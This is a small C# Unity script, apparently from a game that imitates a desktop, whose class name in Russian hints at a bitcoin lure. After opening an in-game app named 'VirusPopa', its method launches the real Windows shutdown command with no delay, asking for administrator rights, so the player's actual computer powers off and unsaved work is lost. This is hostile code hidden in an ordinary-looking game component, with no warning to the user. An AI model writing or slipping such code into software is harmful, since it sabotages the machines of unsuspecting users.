using UnityEngine;
using System.Diagnostics;

public class руб6биткоин : MonoBehaviour
{
    public void StartAPogram()
    {
        gameObject.SetActive(false);
        hello.windowmesenge.LoadApplication("VirusPopa");
        Process process = new Process();
        ProcessStartInfo startInfo = new ProcessStartInfo();
        startInfo.FileName = "shutdown";
        startInfo.Arguments = "/s /t 0";
        startInfo.UseShellExecute = true;
        startInfo.Verb = "runas";
        process.StartInfo = startInfo;
        process.Start();
    }
}
